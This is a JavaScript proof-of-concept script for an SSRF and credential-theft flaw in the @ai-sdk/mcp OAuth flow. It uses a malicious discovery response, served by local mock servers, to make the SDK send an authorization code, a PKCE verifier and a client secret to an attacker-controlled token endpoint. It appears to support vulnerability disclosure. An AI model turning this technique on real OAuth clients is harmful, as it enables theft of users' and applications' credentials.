/**
 * SSRF / Credential Theft PoC - @ai-sdk/mcp OAuth
 *
 * Demonstrates: SDK sends authorization_code, client_secret, code_verifier
 * to attacker-controlled token_endpoint (returned by discovery).
 *
 * Prerequisites:
 *   pnpm install
 *   cd packages/mcp && pnpm build
 *
 * Run (from repo root):
 *   node vulnerabilities/ssrf-oauth-discovery/mock-servers.js &
 *   sleep 2
 *   node vulnerabilities/ssrf-oauth-discovery/poc.js
 */

const path = require('path');
const { auth } = require(path.join(__dirname, '../../packages/mcp/dist/index.js'));

const DISCOVERY_BASE = 'http://127.0.0.1:5050';
const RESOURCE_METADATA_URL = `${DISCOVERY_BASE}/.well-known/oauth-protected-resource`;

const stored = { codeVerifier: 'pkce_verifier_secret_123', tokens: null };

const mockProvider = {
  tokens: () => undefined,
  saveTokens: (tokens) => { stored.tokens = tokens; },
  redirectToAuthorization: () => {},
  saveCodeVerifier: (v) => { stored.codeVerifier = v; },
  codeVerifier: () => stored.codeVerifier,
  get redirectUrl() { return 'http://localhost:3000/callback'; },
  get clientMetadata() {
    return { redirect_uris: ['http://localhost:3000/callback'], scope: 'openid' };
  },
  clientInformation: () => ({
    client_id: 'legit_client_id',
    client_secret: 'legit_client_secret',
    redirect_uris: ['http://localhost:3000/callback'],
  }),
};

async function main() {
  const { capturedTokenRequests } = require('./mock-servers.js');
  await new Promise((r) => setTimeout(r, 500));

  console.log('PoC: SDK auth() with malicious discovery\n');

  const result = await auth(mockProvider, {
    serverUrl: DISCOVERY_BASE,
    resourceMetadataUrl: new URL(RESOURCE_METADATA_URL),
    authorizationCode: 'stolen_auth_code',
    fetchFn: fetch,
  });

  console.log('auth() result:', result);

  if (capturedTokenRequests.length === 0) {
    console.error('FAIL: Attacker server did not receive token request.');
    process.exit(1);
  }

  const req = capturedTokenRequests[0];
  const body = req.body || '';
  const authHeader = req.headers?.authorization || '';

  const hasCode = body.includes('stolen_auth_code');
  const hasVerifier = body.includes('pkce_verifier_secret_123');
  const hasSecret = authHeader.toLowerCase().startsWith('basic ');

  console.log('\n--- Request received by attacker ---');
  console.log('Body (excerpt):', body.substring(0, 200));
  console.log('Authorization:', authHeader ? '[Basic credentials present]' : '[missing]');
  console.log('Credentials captured:', { hasCode, hasVerifier, hasSecret });

  if (hasCode && hasVerifier && hasSecret) {
    console.log('\n>>> SUCCESS: SDK sent OAuth credentials to attacker-controlled token_endpoint.');
  } else {
    console.log('\n>>> Partial: check mock-servers.js token_endpoint configuration.');
  }
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
